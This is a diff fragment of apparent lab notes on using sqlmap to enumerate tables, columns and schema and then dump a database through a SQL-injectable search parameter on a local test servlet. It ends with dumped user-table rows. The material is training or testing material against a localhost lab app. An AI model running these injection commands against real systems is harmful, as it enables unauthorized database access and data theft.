@@ -24,13 +24,17 @@ $ ./sqlmap.py -u "http://localhost:8080/Servlet-Search/controller?lastname=Simps
 		
 $ ./sqlmap.py -u "http://localhost:8080/Servlet-Search/controller?lastname=Simpson&action=Search" --tables
 		
-$ ./sqlmap.py --proxy=http://localhost:8010 -u "http://localhost:8080/Servlet-Search/controller?lastname=Simpson&action=Search" --tables		
+$ ./sqlmap.py -u "http://localhost:8080/Servlet-Search/controller?lastname=Simpson&action=Search" --tables		
 		
-$ ./sqlmap.py --proxy=http://localhost:8010 -u "http://localhost:8080/Servlet-Search/controller?lastname=Simpson&action=Search" -D testdb --columns
+$ ./sqlmap.py -u "http://localhost:8080/Servlet-Search/controller?lastname=Simpson&action=Search" -D testdb --columns
 
-$ ./sqlmap.py --proxy=http://localhost:8010 -u "http://localhost:8080/Servlet-Search/controller?lastname=Simpson&action=Search" -D testdb --schema
+$ ./sqlmap.py -u "http://localhost:8080/Servlet-Search/controller?lastname=Simpson&action=Search" -D testdb --schema
 
-$ ./sqlmap.py --proxy=http://localhost:8010 -u "http://localhost:8080/Servlet-Search/controller?lastname=Simpson&action=Search" -D testdb --count
+$ ./sqlmap.py -u "http://localhost:8080/Servlet-Search/controller?lastname=Simpson&action=Search" -D testdb --count
+
+$ ./sqlmap.py -u "http://localhost:8080/Servlet-Search/controller?lastname=Simpson&action=Search" -D testdb --dump
+
+If we need want to use an interception proxy, we type:
 
 $ ./sqlmap.py --proxy=http://localhost:8010 -u "http://localhost:8080/Servlet-Search/controller?lastname=Simpson&action=Search" -D testdb --dump
 
@@ -47,7 +51,3 @@ Table: user
 | 5  | magie    | Simpson  | maggie   | Maggie     |
 | 6  | monty    | Burns    | monty    | Montgomery |
 +----+----------+----------+----------+------------+
-
-
-		
-		
